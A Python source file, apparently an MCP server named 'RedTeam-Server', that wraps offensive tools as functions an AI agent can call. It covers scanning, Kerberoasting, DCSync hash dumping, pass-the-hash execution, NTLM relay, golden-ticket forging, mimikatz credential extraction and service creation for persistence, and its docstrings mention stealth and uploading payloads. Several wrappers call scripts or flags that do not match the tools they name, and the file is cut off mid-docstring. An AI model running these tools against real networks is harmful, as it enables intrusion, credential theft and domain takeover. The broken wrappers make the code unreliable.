import asyncio
import shlex
import subprocess
import re
import os
import sys
import base64
from mcp.server.fastmcp import FastMCP

# ==============================================================================
#  RedTeam MCP 服务器
# ==============================================================================
# 使用 mcp 官方提供的 FastMCP 快速构建工具库
mcp = FastMCP("RedTeam-Server")

# ==============================================================================
#  ⚠️ Windows 用户注意事项 ⚠️
# ==============================================================================
# 如果执行 impacket 工具时提示找不到命令，请选择以下方案之一：
#
# 方案 1：将 impacket 安装目录添加到系统 PATH 环境变量
#   - impacket 默认安装在: <Python安装目录>\Scripts\
#   - 查找方法: 在 PowerShell 中运行: (python -c "import impacket; print(impacket.__file__)")
#   - 将该目录添加到 PATH 后重启终端
#
# 方案 2：使用 python -m 方式调用
#   - 例如: python -m impacket.examples.wmiexec ...
#   - 不依赖 PATH 配置
#
# 方案 3：配置本 MCP 服务器的工具路径
#   - 修改 invoke_impacket_* 函数的 command 列表，使用完整路径或 python -m 前缀
# ==============================================================================

def optimize_output(text: str, limit: int = 8000) -> str:
    """
    清洗并截断工具输出，剥离 ANSI 颜色乱码以极大节省 Token 消耗，
    并防止超长输出导致大模型上下文遗忘或崩溃。
    """
    if not text:
        return ""
    # 清除终端 ANSI 颜色代码（颜色乱码极其消耗大模型 Token）
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    text = ansi_escape.sub('', text)
    # 压缩连续空行
    text = re.sub(r'\n\s*\n', '\n', text)
    
    if len(text) > limit:
        return text[:limit] + f"\n\n...[⚠️ 输出过长已被系统截断。当前展示前 {limit} 字符以节省 Token 消耗。如需更多详情，请要求 AI 缩小探测范围（如使用更具体的网段、端口或字典）]..."
    return text

async def run_command_with_timeout(command: list[str], timeout: int = 120) -> str:
    """
    异步运行系统命令，带有超时保护和标准输出捕获。
    避免网络工具长时间挂起导致 AI / 客户端阻塞。
    """
    try:
        # 启动子进程，并将输出重定向到 PIPE
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 增加超时等待机制
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        
        output = stdout.decode('utf-8', errors='ignore')
        err_output = stderr.decode('utf-8', errors='ignore')
        
        combined_output = output if output else err_output
        optimized_result = optimize_output(combined_output)
        
        # 即使进程返回非 0 状态码 (常常发生于漏洞探测工具)，也必须返回它的输出，让 AI 能看到真实情况
        if process.returncode != 0:
            return f"命令执行结束 (退出码 {process.returncode})。\n返回内容:\n{optimized_result}"
        
        return optimized_result
        
    except asyncio.TimeoutError:
        # 超时时必须杀掉进程
        process.kill()
        return f"执行失败: 命令执行超时 (超过了 {timeout} 秒)。网络连接或扫描可能有问题。"
    except FileNotFoundError:
        return f"执行失败: 找不到可执行文件 '{command[0]}'，请验证它是否在系统的环境变量 PATH 中。"
    except PermissionError:
        return f"执行失败: 权限被拒绝，如果你使用的是快捷方式（.lnk），请检查快捷方式的指向或以管理员权限运行。"
    except Exception as e:
        return f"执行失败: 发生未知异常: {str(e)}"

@mcp.tool()
async def invoke_nxc(protocol: str, target: str, args: str = "") -> str:
    """
    使用 NetExec (nxc) 进行跨协议网络渗透测试和信息收集。
    支持 smb, ssh, winrm, wmi, mssql 等。
    
    :param protocol: 协议名称 (如 'smb', 'ssh', 'winrm')。必须填写。
    :param target: 目标 IP、网段或主机名。
    :param args: nxc 的附加参数字符串 (如 '-u username -p password --shares')。
    """
    command = ["nxc", protocol, target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_gogo(target: str, args: str = "") -> str:
    """
    使用 gogo 扫描器进行快速资产和指纹识别。
    
    :param target: 目标 IP 或网段，将作为 '-i' 参数传入。
    :param args: 附加参数 (如 '-p 80,443' 或 '-m 1')。
    """
    command = ["gogo", "-i", target]
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=240)


@mcp.tool()
async def invoke_fscan(target: str, args: str = "") -> str:
    """
    使用 fscan 进行快速内网资产扫描和漏洞发现。
    适用于内网大范围极速探活、弱口令爆破和常见漏洞(如 MS17-010, Weblogic)扫描。
    
    :param target: 目标 IP、网段或文件路径，对应 fscan 的 -h 参数 (例如 '192.168.1.1/24')。
    :param args: fscan 的附加参数 (例如 '-p 1-65535' 或 '-nobr' 跳过爆破)。
    """
    command = ["fscan", "-h", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_httpx(target: str, args: str = "") -> str:
    """
    使用 httpx (ProjectDiscovery) 进行 HTTP 存活检测和指纹识别。
    适用于快速探测目标 Web 服务的存活状态、Title、状态码和中间件。
    
    :param target: 目标 IP、域名或目标列表文件 (例如 'example.com' 或 '192.168.1.1')。
    :param args: 附加参数 (例如 '-title -status-code -tech-detect')。可以在 args 里通过 -u 直接提供目标。
    """
    command = ["httpx"]
    if target and not target.startswith("-"):
        command.extend(["-u", target])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_nuclei(target: str, templates: str = "", args: str = "") -> str:
    """
    使用 Nuclei 进行基于模板的定向漏洞扫描。
    适合在发现特定指纹后，使用特定的模板进行验证，避免盲目全量扫描。
    
    :param target: 目标 URL 或 IP。
    :param templates: 指定使用的模板名或路径 (例如 'cves/' 或 'technologies/wordpress/')。留空则执行默认范围。
    :param args: 附加参数 (例如 '-severity critical,high')。
    """
    command = ["nuclei", "-u", target]
    if templates:
        command.extend(["-t", templates])
    if args:
         command.extend(shlex.split(args))
         
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_ffuf(target: str, wordlist: str, args: str = "") -> str:
    """
    使用 ffuf 进行 Web 目录、隐藏文件、API 路由或内网虚拟主机名（VHost）的爆破与发现。
    适用场景：当 httpx 发现了某个内部 Web 服务，但首页是 403 或 404，你需要寻找后台入口、未授权 API 或遗留备份文件时。
    
    :param target: 目标 URL，必须包含 FUZZ 关键字 (例如 'http://192.168.1.1/FUZZ' 或 'http://FUZZ.corp.local')。
    :param wordlist: 字典文件所在的绝对路径 (例如 'd:/mcp/redteam-tools/dict.txt')。
    :param args: 附加参数，比如过滤长度、指定状态码 (例如 '-mc 200,301,302' 或 '-t 50')。
    """
    command = ["ffuf", "-u", target, "-w", wordlist]
    if args:
        command.extend(shlex.split(args))
    # 路径爆破耗时较长，给定足够超时时间
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_bloodhound_python(domain: str, dc_ip: str, auth_options: str, args: str = "-c All") -> str:
    """
    使用 bloodhound-python 收集 Active Directory (活动目录域) 的内部核心网络拓扑和权限路径。
    适用场景：当你在内网中获取了一个（即便权限极低的）域账号，你想分析域控路径、信任关系、是否有可利用的弱组策略或可委派权限。
    它不仅是收集工具，更是 AI 进行【域内提权攻击图谱分析】的无上利器！

    :param domain: 内部域的完整名称 (例如 'corp.local')。
    :param dc_ip: 域控制器的 IP 地址 (如 '192.168.1.10')。
    :param auth_options: 认证相关参数，由于涉及凭证，作为一个整体传入以支持明文密码或哈希传参 (如 '-u username -p password' 或者是 hashes)。
    :param args: 附加数据收集指令 (默认为 '-c All' 收集所有信息)。
    """
    command = ["bloodhound-python", "-d", domain, "-dc", dc_ip]
    if auth_options:
        command.extend(shlex.split(auth_options))
    if args:
        command.extend(shlex.split(args))

    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_sharphound(collection_method: str = "Default", domain: str = "", dc: str = "", username: str = "",
                            password: str = "", hashes: str = "", kerberos: bool = False,
                            output_dir: str = "", zip_filename: str = "", args: str = "") -> str:
    """
    使用 SharpHound 收集 Active Directory 权限图谱数据（Windows BloodHound 收集器）。
    适用场景：在 Windows 域内机器上运行，收集用户-计算机会话、ACL 权限、组关系、信任链、GPO 分析等，
    生成可导入 BloodHound GUI 的 ZIP 文件进行可视化攻击路径分析。

    :param collection_method: 收集方法 (如 'Default', 'All', 'Session', 'ACL', 'LoggedOn', 'GPOAnalytic')。
    :param domain: 目标域名称 (如 'corp.local')。
    :param dc: 域控制器地址（可多个，逗号分隔）。
    :param username: 认证用户名。
    :param password: 认证密码。
    :param hashes: NTLM 哈希 (格式 'LMHASH:NTHASH' 或 ':NTHASH')。
    :param kerberos: 是否使用 Kerberos 认证。
    :param output_dir: 输出目录路径。
    :param zip_filename: ZIP 输出文件名。
    :param args: 附加参数。
    """
    command = ["SharpHound.exe", "-c", collection_method]

    if domain:
        command.extend(["-d", domain])
    if dc:
        command.extend(["-dc", dc])
    if username:
        command.extend(["-u", username])
    if password:
        command.extend(["-p", password])
    if hashes:
        command.extend(["-Hashes", hashes])
    if kerberos:
        command.append("-k")
    if output_dir:
        command.extend(["-o", output_dir])
    if zip_filename:
        command.extend(["--zipfilename", zip_filename])
    if args:
        command.extend(shlex.split(args))

    return await run_command_with_timeout(command, timeout=600)

@mcp.tool()
async def invoke_bloodhound_analysis(data_path: str) -> str:
    """
    分析 BloodHound 收集的 JSON 数据，生成可读的攻击路径分析报告。
    适用场景：在收集完 AD 数据后（通过 SharpHound 或 bloodhound-python），使用此工具分析数据、
    识别攻击路径、发现高价值目标和潜在横向移动路径。

    生成的报告包含：
    - 环境概览（域/用户/计算机/组数量）
    - 高价值目标识别
    - 用户会话分析（找活跃用户）
    - 本地管理员权限映射
    - 组关系分析（找特权组成员）
    - ACL 危险权限检测
    - 域信任关系
    - GPO 策略分析
    - 远程管理会话（PSRemote/RDP）
    - 攻击路径总结（Kerberoast/AS-REP Roastable 发现）

    :param data_path: BloodHound JSON 数据文件的目录路径。
                      SharpHound 会在当前目录或指定目录输出 JSON 文件。
                      传入目录路径即可，脚本会自动查找 computers.json, users.json 等文件。
                      例如: 'd:\bh_collect' 或 './20260330123456_BloodHound'
    """
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bloodhound_analysis.py")

    if not os.path.exists(script_path):
        return f"执行失败: 找不到分析脚本 bloodhound_analysis.py"

    if not os.path.exists(data_path):
        return f"执行失败: 数据路径不存在: {data_path}"

    # 检查是否有 JSON 文件
    json_files = [f for f in os.listdir(data_path) if f.endswith('.json')]
    if not json_files:
        return f"执行失败: 目录中未找到 JSON 文件: {data_path}\n请确认 SharpHound 收集的数据已保存到此目录"

    command = [sys.executable, script_path, data_path]
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_impacket_roasting(attack_type: str, domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
    """
    执行活动目录(AD)中的哈希提取攻击：AS-REP Roasting 或 Kerberoasting。
    适用场景：当你处于域外或拥有一个低权限域账号，想尝试获取其他(如服务账号、无预认证用户)的哈希以进行离线破解时。
    
    :param attack_type: "asreproast" (抓取无预认证用户的哈希) 或 "kerberoast" (抓取 SPN 服务账号的哈希)。
    :param domain: 域名 (如 'corp.local')。
    :param dc_ip: 域控 IP 地址。
    :param auth: 认证凭据格式 'user:pass'。如果是 asreproast 且没有密码，可以只填 'user' 或不填留空尝试匿名。
    :param args: 附加参数。Kerberoasting 通常需要 '-request'。例如 '-request -format hashcat'。
    """
    tool = "GetNPUsers.py" if attack_type.lower() == "asreproast" else "GetUserSPNs.py"
    command = [tool]
    if auth:
        command.append(f"{domain}/{auth}")
    else:
        command.append(domain + "/")
    command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_dcsync(auth_uri: str, dc_ip: str = "", args: str = "") -> str:
    """
    使用 secretsdump.py 模拟域控执行 DCSync 攻击，导出全域或特定用户的 NTLM Hash / Kerberos 密钥。
    适用场景：你已经获取了域管(Domain Admin)或具有 Replicating Directory Changes 权限的域账号，准备接管整个域或做权限维持(黄金票据/白银票据)时进行哈希抽取。
    
    :param auth_uri: 认证与目标信息，格式为 'domain/username:password@target_ip' 或传 hashes时填 'domain/user@target_ip'。
    :param dc_ip: 域控 IP 地址 (如果 auth_uri 中的 target_ip 不是域控，则需要此参数指定域控)。
    :param args: 附加参数。使用 PtH: '-hashes LMHASH:NTHASH'。如果不需要全部导出，只查单个用户: '-just-dc-user username'。
    """
    command = ["secretsdump.py", auth_uri]
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if not args or "-just-dc" not in args:
        command.append("-just-dc") # DCSync 默认必需参数
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_pth_exec(auth_uri: str, cmd: str, args: str = "") -> str:
    """
    使用 wmiexec.py / psexec.py / smbexec.py 执行 Pass-the-Hash (PtH 过哈希) 横向移动，获取交互式命令执行结果。
    适用场景：当你通过前置攻击收集到了某个机器的 Local Admin 或域管的 NTHash，你想直接在这台机器上执行系统命令时。
    
    :param auth_uri: 认证与目标，格式为 'domain/user:pass@ip' 或 'domain/user@ip' (结合 -hashes 使用)。
    :param cmd: 要执行的系统命令 (例如 'whoami'、'ipconfig' 或 'powershell -c ...')。
    :param args: 附加参数。必须包含 PtH 哈希例如 '-hashes :NTHASH'，注意前面有一个冒号；也可以指定执行工具例如使用 psexec: '-exec psexec.py' (默认 wmiexec)。
    """
    # 默认使用较为隐蔽的 wmiexec
    tool = "wmiexec.py"
    # 如果 args 中包含了想要替换工具的意图，我们可以稍微做下转换，不过简单起见直接调 wmiexec
    command = [tool]
    if args:
        command.extend(shlex.split(args))
    command.extend([auth_uri, cmd])
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_delegation_ticket(spn: str, auth_uri: str, impersonate: str = "", dc_ip: str = "", args: str = "") -> str:
    """
    使用 getST.py 申请伪造的服务票据，执行域委派攻击 (约束委派 / 基于资源的约束委派 S4U2Self/S4U2Proxy)。
    适用场景：当你发现了一个配置了约束委派的机器账户(或其哈希/密码)，或者是利用基于资源的约束委派(RBCD)提权时，可以利用此工具伪造 Administrator 的票据。生成的 .ccache 文件可用于后续攻击。
    
    :param spn: 目标服务主体名称 (例如 'cifs/target.corp.local')。
    :param auth_uri: 具有委派权限的机器账号或用户账号凭据 (格式 'domain/user:pass' 或 'domain/user')。
    :param impersonate: 要伪造/模拟的域用户 (通常是 'Administrator')，触发 S4U2Self 流程。
    :param dc_ip: 域控 IP。
    :param args: 附加参数 (如 '-hashes LM:NT' 或指定输出票据名 '-out ticket.ccache')。
    """
    command = ["getST.py", "-spn", spn]
    if impersonate:
        command.extend(["-impersonate", impersonate])
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_smbclient(auth_uri: str, share: str = "C$", cmd: str = "", args: str = "") -> str:
    """
    使用 smbclient.py 通过 SMB 协议连接远程共享，并执行交互式命令或单条命令。
    适用场景：获取到 SMB 账号密码后，想列出共享、上传/下载文件、访问远程文件系统。
    
    :param auth_uri: 认证信息，格式为 'domain/username:password@target'。
    :param share: 目标共享名称 (默认 'C$')。
    :param cmd: 要执行的单条 SMB 命令 (如 'ls'、'download file.txt'、'upload payload.exe')，留空则进入交互模式。
    :param args: 附加参数 (如 '-hashes :NTHASH' 或 '-port 445')。
    """
    command = ["smbclient.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if share:
        command.extend(["-share", share])
    if cmd:
        command.append(cmd)
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_ntlmrelayx(targets: str, smb2http: bool = False, escalate_user: str = "", dump_domain: bool = False,
                            aes_key: str = "", args: str = "") -> str:
    """
    使用 ntlmrelayx.py 执行 NTLM 中继攻击，将截获的 Net-NTLM 哈希 Relay 到指定目标。
    适用场景：在内网中结合 Responder 抓取到哈希后，中继到 SMB/LDAP 等协议获取凭据或执行命令。
    
    :param targets: 中继目标列表文件或单个目标 (如 'targets.txt' 或 'smb://192.168.1.100')。
    :param smb2http: 是否将 SMB 流量中继到 HTTP。
    :param escalate_user: 中继成功后要提权的用户名。
    :param dump_domain: 是否执行 DCSync 导出域密码哈希。
    :param aes_key: 用于 Kerberos 认证的 AES key。
    :param args: 附加参数 (如 '-tf targets.txt' 或 '-t smb://target')。
    """
    command = ["ntlmrelayx.py"]
    if targets:
        if os.path.exists(targets):
            command.extend(["-tf", targets])
        else:
            command.extend(["-t", targets])
    if smb2http:
        command.append("-smb2http")
    if escalate_user:
        command.extend(["-e", escalate_user])
    if dump_domain:
        command.append("-d")
    if aes_key:
        command.extend(["-aesKey", aes_key])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_ticketer(domain: str, user: str, hash: str = "", nthash: str = "",
                          sid: str = "", aes_key: str = "", extra_sids: str = "",
                          lifetime: int = 10, args: str = "") -> str:
    """
    使用 ticketer.py 伪造 Kerberos 票据 (Golden Ticket / Silver Ticket)。
    适用场景：获取到 krbtgt 哈希后伪造任意用户/域管票据，或利用服务账户哈希伪造 Silver Ticket。
    
    :param domain: 域名 (如 'corp.local')。
    :param user: 要伪造的用户名 (如 'Administrator')。
    :param hash: krbtgt 用户的 LMHASH:NTHASH 哈希。
    :param nthash: NTHASH (简写，可单独指定)。
    :param sid: 域的 SID (如 'S-1-5-21-xxxxx')。
    :param aes_key: AES key (可选，优先于 hash)。
    :param extra_sids: 额外的 SID 列表 (如 'S-1-5-21-xxx-519' 表示 Enterprise Admins)。
    :param lifetime: 票据有效期，默认 10 小时。
    :param args: 附加参数。
    """
    command = ["ticketer.py", "-domain", domain, "-domain-sid", sid]
    if extra_sids:
        command.extend(["-extra-sid", extra_sids])
    if hash:
        command.extend(["-hashes", hash])
    elif nthash:
        command.extend(["-hashes", f":{nthash}"])
    if aes_key:
        command.extend(["-aesKey", aes_key])
    command.extend(["-duration", str(lifetime)])
    command.append(user)
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_psexec_exec(auth_uri: str, cmd: str = "cmd.exe", exe: str = "", args: str = "") -> str:
    """
    使用 psexec.py 远程在目标机器上执行程序 (通过 SMB 创服务和启动进程)。
    适用场景：获取到本地管理员或域管凭据后，想在远程 Windows 主机上执行系统命令或上传恶意程序。
    注意：此工具会在目标机器上创建服务，可能触发杀软，建议用于已确认无杀软的靶标。
    
    :param auth_uri: 认证信息，格式为 'domain/username:password@target_ip'。
    :param cmd: 要执行的命令 (默认 'cmd.exe')。
    :param exe: 要执行的程序路径 (可选，如 '\\windows\\system32\\calc.exe')。
    :param args: 附加参数 (如 '-hashes :NTHASH')。
    """
    command = ["psexec.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if exe:
        command.extend(["-c", exe])
    command.extend(["-e", cmd] if cmd else [])
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_smbexec(auth_uri: str, cmd: str = "", mode: str = "exe", args: str = "") -> str:
    """
    使用 smbexec.py 横向移动执行，通过 SMB 共享执行命令而不创建服务(比 psexec 更隐蔽)。
    适用场景：需要横向执行命令但不想创建服务以规避检测。
    
    :param auth_uri: 认证信息，格式为 'domain/username:password@target_ip'。
    :param cmd: 要执行的命令。
    :param mode: 执行模式 - 'exe' (上传执行) 或 'share' (共享执行)。
    :param args: 附加参数。
    """
    command = ["smbexec.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if cmd:
        command.extend(["-c", cmd])
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_dcomexec(auth_uri: str, target_host: str = "", cmd: str = "whoami", args: str = "") -> str:
    """
    使用 dcomexec.py 通过 DCOM (分布式组件对象模型) 执行远程命令。
    适用场景：绕过常规 SMB 横向的限制，通过 MMC20 Application、ShellWindows 等 DCOM 接口执行命令。
    
    :param auth_uri: 认证信息，格式为 'domain/username:password@target_ip'。
    :param target_host: DCOM 目标主机 (可以是 IP 或主机名)。
    :param cmd: 要执行的命令。
    :param args: 附加参数。
    """
    command = ["dcomexec.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if target_host:
        command.extend(["-object", target_host])
    command.append(cmd)
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_rpcdump(target: str, auth_uri: str = "", auth_type: str = "ncan_np",
                         pipes: str = "", args: str = "") -> str:
    """
    使用 rpcdump.py 枚举远程主机的 RPC 端点和服务。
    适用场景：探测目标开放了哪些 RPC 接口，识别操作系统版本或寻找可利用的 DCOM 服务。
    
    :param target: 目标主机 IP 或主机名。
    :param auth_uri: 认证信息 (可选，格式 'domain/user:pass@target')。
    :param auth_type: 认证类型 (ncan_np/smb/msmq)。
    :param pipes: 过滤的管道名 (可选)。
    :param args: 附加参数。
    """
    command = ["rpcdump.py"]
    if auth_uri:
        command.append(auth_uri)
    else:
        command.append(target)
    if pipes:
        command.extend(["-pipes", pipes])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_nfs_mount(target: str, path: str, auth_uri: str = "", local_mount: str = "", args: str = "") -> str:
    """
    使用 nfs_mount.py 挂载远程 NFS 共享。
    适用场景：探测到开放的 NFS 服务后，挂载共享目录读取敏感文件(如 SSH 密钥、配置文件等)。
    
    :param target: NFS 服务器 IP。
    :param path: 远程 NFS 共享路径 (如 '/share')。
    :param auth_uri: 认证信息 (NFS 通常无认证，但可指定 domain)。
    :param local_mount: 本地挂载点目录路径，留空则使用 ./nfs_mount。
    :param args: 附加参数。
    """
    command = ["nfs_mount.py", target]
    if path:
        command.extend(["-o", f"mount={path}"])
    if auth_uri:
        command.append(auth_uri)
    if local_mount:
        command.extend(["-o", f"dest={local_mount}"])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_mssqlclient(auth_uri: str, sql_cmd: str = "", database: str = "master", args: str = "") -> str:
    """
    使用 mssqlclient.py 连接 MS SQL Server 执行 SQL 命令。
    适用场景：获取到 SQL 账号后，想执行 SQL 语句、读取数据、或利用 xp_cmdshell 执行系统命令。
    
    :param auth_uri: 认证信息，格式为 'domain/username:password@target_ip'。
    :param sql_cmd: 要执行的 SQL 命令 (如 'SELECT @@version' 或 'EXEC xp_cmdshell whoami')。
    :param database: 默认数据库 (默认 'master')。
    :param args: 附加参数。
    """
    command = ["mssqlclient.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if database:
        command.extend(["-db", database])
    if sql_cmd:
        command.append(sql_cmd)
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_mimikatz(dump_type: str = "all", auth_uri: str = "", target: str = "",
                          lsass_dump: bool = False, sam: bool = False, secrets: bool = False,
                          args: str = "") -> str:
    """
    使用 mimikatz.py 执行凭据提取 (sekurlsa / lsadump 模块)。
    适用场景：获取到管理员权限后，想从 LSASS 进程、SAM 数据库、域控缓存中提取明文凭据。
    注意：需要管理员权限执行。
    
    :param dump_type: 提取类型 - 'all' (全部) / 'sekurlsa' (sekurlsa::logonPasswords) / 'lsadump' (lsadump::dcsync)。
    :param auth_uri: 认证信息，格式为 'domain/username:password@target'。
    :param target: 目标主机 (如果 auth_uri 未包含)。
    :param lsass_dump: 是否执行 lsass 进程 dump。
    :param sam: 是否提取 SAM 数据库。
    :param secrets: 是否提取 LSA Secrets。
    :param args: 附加参数。
    """
    command = ["mimikatz.py"]
    if auth_uri:
        command.append(auth_uri)
    elif target:
        command.append(target)
    
    if dump_type == "sekurlsa" or lsass_dump:
        command.extend(["-dump", "sekurlsa"])
    elif dump_type == "lsadump" or secrets or sam:
        command.extend(["-dump", "lsadump"])
    else:
        command.extend(["-dump", "all"])
    
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_goldenPac(domain: str, user: str, password: str, target: str,
                           dc_ip: str = "", krbtgt_hash: str = "", args: str = "") -> str:
    """
    使用 goldenPac.py 自动执行 Golden Ticket 攻击并维持目标机器的访问权限。
    适用场景：获取 krbtgt 哈希后，使用 Golden Ticket 持久化访问域内任意机器。
    
    :param domain: 域名 (如 'corp.local')。
    :param user: 认证用户名。
    :param password: 认证密码。
    :param target: 目标主机 (单个 IP 或 'hostfile.txt')。
    :param dc_ip: 域控制器 IP。
    :param krbtgt_hash: krbtgt 账号的 NTHASH。
    :param args: 附加参数。
    """
    command = ["goldenPac.py", f"{domain}/{user}:{password}@{target}"]
    if dc_ip:
        command.extend(["-dc-ip", dc_ip])
    if krbtgt_hash:
        command.extend(["-hashes", f":{krbtgt_hash}"])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_kintercept(target: str, auth_uri: str = "", mode: str = "read",
                            query: str = "", args: str = "") -> str:
    """
    使用 kintercept.py (kerberos枚举/票据操作) 执行 Kerberos 相关操作。
    适用场景：枚举 Kerberos 票据、查看 TGT、请求特定服务票据等。
    
    :param target: 目标主机或域。
    :param auth_uri: 认证信息 (格式 'domain/user:pass@target')。
    :param mode: 操作模式 - 'read' (读取票据) / 'request' (请求票据) / 'renew' (续期票据)。
    :param query: 查询条件 (如 SPN 名称)。
    :param args: 附加参数。
    """
    command = ["kintercept.py"]
    if auth_uri:
        command.append(auth_uri)
    else:
        command.append(target)
    command.extend(["-mode", mode])
    if query:
        command.extend(["-query", query])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_opdump(target: str, auth_uri: str = "", protocol: str = "ldap",
                        binding: str = "", args: str = "") -> str:
    """
    使用 opdump.py 绑定到指定 RPC 协议端点进行操作。
    适用场景：手动绑定 MS-RPCE 端点进行协议交互探测。
    
    :param target: 目标主机 IP。
    :param auth_uri: 认证信息 (可选)。
    :param protocol: 协议类型 (ldap/smb/ncacn_np/http)。
    :param binding: 绑定字符串。
    :param args: 附加参数。
    """
    command = ["opdump.py", target]
    if protocol:
        command.extend(["-protocol", protocol])
    if binding:
        command.extend(["-binding", binding])
    if auth_uri:
        command.append(auth_uri)
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_registry_read(auth_uri: str, hive: str = "HKLM", path: str = "",
                               key: str = "", args: str = "") -> str:
    """
    使用 registry_read.py 读取远程注册表。
    适用场景：查询目标机器的注册表获取系统配置、已安装软件、启动项等敏感信息。
    
    :param auth_uri: 认证信息，格式为 'domain/user:pass@target'。
    :param hive: 注册表配置单元 - 'HKLM' 或 'HKU'。
    :param path: 注册表路径 (如 'SYSTEM\\CurrentControlSet\\Services\\')。
    :param key: 要读取的特定键名。
    :param args: 附加参数。
    """
    command = ["registry_read.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    command.extend(["-HiveName", hive])
    if path:
        command.extend(["-SubKey", path])
    if key:
        command.append(key)
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_services(auth_uri: str, action: str = "query", service_name: str = "",
                          display_name: str = "", args: str = "") -> str:
    """
    使用 services.py 枚举、启动、停止、创建或删除 Windows 服务。
    适用场景：在横向移动后管理目标机器上的 Windows 服务，实现持久化或提权。
    
    :param auth_uri: 认证信息，格式为 'domain/user:pass@target'。
    :param action: 操作类型 - 'query' (查询) / 'start' (启动) / 'stop' (停止) / 'create' (创建) / 'delete' (删除)。
    :param service_name: 服务名 (如 'VulnService')。
    :param display_name: 服务的显示名称。
    :param args: 附加参数。
    """
    command = ["services.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    command.extend(["-action", action])
    if service_name:
        command.extend(["-service-name", service_name])
    if display_name:
        command.extend(["-display-name", display_name])
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_netview(targets: str = "", auth_uri: str = "", get_sessions: bool = False,
                         get_loggedin_users: bool = False, args: str = "") -> str:
    """
    使用 netview.py 枚举域内主机、共享、会话和登录用户。
    适用场景：域内信息收集，发现潜在横向目标。
    
    :param targets: 目标主机列表文件或单个主机。
    :param auth_uri: 认证信息。
    :param get_sessions: 是否获取会话信息。
    :param get_loggedin_users: 是否获取登录用户信息。
    :param args: 附加参数。
    """
    command = ["netview.py"]
    if auth_uri:
        command.append(auth_uri)
    if targets:
        if os.path.exists(targets):
            command.extend(["-targetfile", targets])
        else:
            command.extend(["-target", targets])
    if get_sessions:
        command.append("-show-sessions")
    if get_loggedin_users:
        command.append("-show-loggedin")
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=180)

@mcp.tool()
async def invoke_lookupsid(target: str, domain: str = "", auth_uri: str = "",
                           range_start: str = "500", range_end: str = "550", args: str = "") -> str:
    """
    使用 lookupsid.py 通过 LSARPC 接口枚举域用户和组的 SID 历史。
    适用场景：获取域内用户名列表，通过 RID 暴力猜测发现隐藏账户。
    
    :param target: 目标主机 IP。
    :param domain: 域名。
    :param auth_uri: 认证信息 (格式 'domain/user:pass@target')。
    :param range_start: SID 范围起始值 (默认 500)。
    :param range_end: SID 范围结束值 (默认 550)。
    :param args: 附加参数。
    """
    command = ["lookupsid.py"]
    if auth_uri:
        command.append(auth_uri)
    else:
        command.append(target)
    if domain:
        command.extend(["-domain", domain])
    command.extend(["-range", f"{range_start}-{range_end}"])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_ldapsearch(domain: str, dc_ip: str, auth_uri: str = "",
                             filter: str = "(objectClass=user)", attributes: str = "",
                             args: str = "") -> str:
    """
    使用 ldapsearch.py (基于 Impacket) 查询 LDAP 目录获取域信息。
    适用场景：枚举域用户、计算机、组、OU、GPO 等 AD 对象。
    
